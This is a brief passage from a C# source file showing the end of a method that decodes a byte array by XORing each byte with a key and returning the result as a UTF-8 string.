        for (var i = 0; i < data.Length; i++)
            buffer[i] = (byte)(data[i] ^ key);
        return System.Text.Encoding.UTF8.GetString(buffer);
    }
}